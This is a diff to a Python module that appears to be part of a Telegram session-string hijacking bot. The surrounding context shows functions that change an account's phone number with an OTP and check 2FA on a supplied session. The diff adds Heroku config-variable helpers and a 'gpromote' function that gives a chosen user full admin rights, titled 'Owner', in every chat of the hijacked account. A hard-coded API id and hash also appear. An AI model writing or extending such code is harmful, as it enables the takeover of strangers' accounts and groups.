@@ -21,6 +21,52 @@ mybot = "missrose_bot"
 
 legendboy = 2024465080
 
+import os
+
+import heroku3
+import urllib3
+
+from ..Config import Config
+
+menu_category = "tools"
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# =================
+
+Heroku = heroku3.from_key(Config.API_KEY)
+heroku_api = "https://api.heroku.com"
+APP_NAME = Config.APP_NAME
+API_KEY = Config.API_KEY
+
+
+async def setvar(variable, value):
+    app = Heroku.app(Config.APP_NAME)
+    heroku_var = app.config()
+    try:
+        heroku_var[variable] = value
+    except Exception as e:
+        return e
+
+
+async def getvar(variable):
+    app = Heroku.app(Config.APP_NAME)
+    heroku_var = app.config()
+    try:
+        lol = heroku_var[variable]
+    except Exception as e:
+        print(e)
+    return lol
+
+
+async def delvar(variable):
+    app = Heroku.app(Config.APP_NAME)
+    heroku_var = app.config()
+    try:
+        del heroku_var[variable]
+    except Exception as e:
+        print(e)
+    return e
+
 
 async def change_number_code(strses, number, code, otp):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -102,6 +148,7 @@ async def promote(strses, grp, user):
                 post_messages=True,
                 add_admins=True,
                 delete_messages=True,
+                pin_messages=True,
             )
         except:
             await X.edit_admin(
@@ -121,6 +168,40 @@ async def user2fa(strses):
             return True
         except:
             return False
+
+
+async def gpromote(strses, user):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            i = 0
+            k = await X(pc())
+            for x in k.chats:
+                try:
+                    await X.edit_admin(
+                        x,
+                        user,
+                        manage_call=True,
+                        invite_users=True,
+                        ban_users=True,
+                        change_info=True,
+                        edit_messages=True,
+                        post_messages=True,
+                        add_admins=True,
+                        delete_messages=True,
+                        pin_messages=True,
+                    )
+                    i += 1
+                except:
+                    await X.edit_admin(
+                        x,
+                        user,
+                        is_admin=True,
+                        anonymous=False,
+                        pin_messages=True,
+                        title="Owner",
+                    )
+        except Exception as e:
+            print(e)
 
 
 async def demall(strses, grp):
